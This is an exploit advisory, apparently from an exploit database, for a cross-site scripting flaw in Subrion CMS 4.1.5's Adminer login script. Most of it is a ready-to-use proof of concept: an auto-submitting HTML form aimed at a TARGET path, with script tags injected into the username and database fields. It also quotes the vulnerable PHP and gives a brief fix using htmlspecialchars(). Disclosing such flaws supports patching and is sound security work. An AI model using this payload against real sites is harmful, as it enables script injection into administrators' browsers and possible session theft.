| Exploit Author: Ashiyane Digital security Team
| Vendor Homepage : https://subrion.org/
| Software Link: https://tools.subrion.org/get/latest.zip
| Version: 4.1.5
| Date: 2017 - 07 - 9
| Tested on: Kali-Linux /FireFox
|__________________________________________________

Exploit :

<html>
<body onload="document.exploit.submit()">
<form action=&#039;http://TARGET/PATH/includes/adminer/adminer.script.php&#039; method=&#039;post&#039;>
<table cellspacing="0">
<tr><th>System<td><select name=&#039;auth[driver]&#039; onchange="loginDriver(this);">
 <option value="server" selected>MySQL</select><tr><th>Server<td>
 <input name="auth[server]" value="" title="hostname[:port]" placeholder="localhost" autocapitalize="off">
<tr><th>Username<td><input name="auth[username]" id="username" value=""/><script>alert(&#039;M.R.S.L.Y/ XSS 1&#039;)</script>" autocapitalize="off">
<tr><th>Password<td><input type="password" name="auth[password]">
<tr><th>Database<td><input name="auth[db]" value=""/><script>alert(&#039;M.R.S.L.Y/ XSS 2&#039;)</script>" autocapitalize="off">
</table>
<script type="text/javascript">
var username = document.getElementById(&#039;username&#039;);
focus(username);
username.form[&#039;auth[driver]&#039;].onchange();
</script>
<p><input type=&#039;submit&#039; value=&#039;Login&#039;>
<label><input type=&#039;checkbox&#039; name=&#039;auth[permanent]&#039; value=&#039;1&#039;>Permanent login</label>
<div></div>
</form>
</html>

__________________________________________________

Vulnerable method :
  $_POST

Vulnerable File :
 /includes/adminer/adminer.script.php

Vulnerable code:


line 367 : 372 
loginForm(){global$Eb;echo&#039;<table cellspacing="0">
<tr><th>System<td>&#039;,html_select("auth[driver]",$Eb,DRIVER,"loginDriver(this);"),&#039;<tr><th>Server<td><input name="auth[server]" value="&#039;,h(SERVER),&#039;" title="hostname[:port]" placeholder="localhost" autocapitalize="off">
<tr><th>Username<td><input name="auth[username]" id="username" value="&#039;,h($_GET["username"]),&#039;" autocapitalize="off">
<tr><th>Password<td><input type="password" name="auth[password]">
<tr><th>Database<td><input name="auth[db]" value="&#039;,h($_GET["db"]);?>" autocapitalize="off">
</table>

    A 
__________________________________________________

#patch:

For fix this vulnerability you use htmlspecialchars() function .

